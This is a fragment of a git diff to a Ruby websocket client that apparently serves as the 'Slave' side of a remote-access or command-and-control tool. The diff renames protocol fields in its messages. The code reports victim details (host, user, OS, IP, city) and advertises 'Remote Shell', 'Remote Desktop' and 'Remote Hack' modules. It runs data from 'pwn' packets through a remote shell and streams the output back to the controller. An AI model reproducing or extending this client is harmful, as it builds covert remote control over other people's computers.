@@ -9,7 +9,7 @@ EM.run {
   ws.on :open do |event|
     p [:open]
     #ws.send('{"header": "identification", "payload": {"id": "2", "type": "Slave", "name": "Android 22", "computer": "4tech-pc", "user": "verbatim", "os": "Linux", "ip": "192.168.1.2", "country": "Philippines", "city": "Minalin", "inators": [{"id": "1111", "name": "Remote Shell"}]}, "trailer": "whoami"}')
-    ws.send('{"header": "identification", "payload": {"id": "3", "type": "Slave", "name": "Android 32", "computer": "4tech-pc", "user": "verbatim", "os": "Linux", "ip": "192.168.1.2", "country": "Philippines", "city": "Minalin", "inators": [{"id": "1111", "name": "Remote Shell"}, {"id": "2222", "name": "Remote Desktop"}, {"id": "3333", "name": "Remote Hack"}]}, "trailer": "whoami"}')
+    ws.send('{"header": "android", "payload": {"id": "1111", "type": "Slave", "name": "Android 23", "computer": "reed-pc", "user": "reedleoneil", "os": "Windows 10", "ip": "192.168.1.3", "country": "Philippines", "city": "Manila", "inators": [{"code": "1111", "name": "Remote Shell"}, {"code": "2222", "name": "Remote Desktop"}, {"code": "3333", "name": "Remote Hack"}]}, "trailer": "whoami"}')
   end
 
   ws.on :message do |event|
@@ -17,8 +17,8 @@ EM.run {
     begin
       packet = JSON.parse(event.data)
       if packet['header'] == "pwn" then
-        client = packet['payload']['client.id']
-        inator = packet['payload']['inator.id']
+        client = packet['payload']['android']
+        inator = packet['payload']['inator']
         data = packet['payload']['data']
         if inator == "1111" then
           remote_shell(ws, data)
@@ -45,8 +45,8 @@ EM.run {
       packet = {
         "header" => "data",
         "payload" => {
-          "client.id" => "3",
-          "inator.id" => "1111",
+          "android" => "1111",
+          "inator" => "1111",
           "data" => "#{line}"
         },
         "trailer" => "#{line}"
@@ -66,8 +66,8 @@ EM.run {
       packet = {
         "header" => "data",
         "payload" => {
-          "client.id" => "3",
-          "inator.id" => "2222",
+          "android" => "1111",
+          "inator" => "2222",
           "data" => "#{line}"
         },
         "trailer" => "#{line}"
